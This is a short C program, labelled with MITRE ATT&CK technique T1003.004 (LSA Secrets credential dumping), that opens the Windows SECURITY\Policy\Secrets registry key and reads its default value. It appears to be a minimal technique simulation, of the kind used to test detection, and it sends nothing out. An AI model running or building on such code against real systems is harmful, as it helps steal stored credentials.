// Link      = https://attack.mitre.org/techniques/T1003/004/
// Technique = OS Credential Dumping: LSA Secrets
// ID        = T1003.004
// Tactics   = Credential Access

#include <windows.h>

int main() {
    HKEY hKey;
    char defaultValue[256];
    DWORD bufferSize = sizeof(defaultValue);

    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\Secrets", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, NULL, NULL, NULL, (LPBYTE)defaultValue, &bufferSize);
        RegCloseKey(hKey);
    }

    return 0;
}




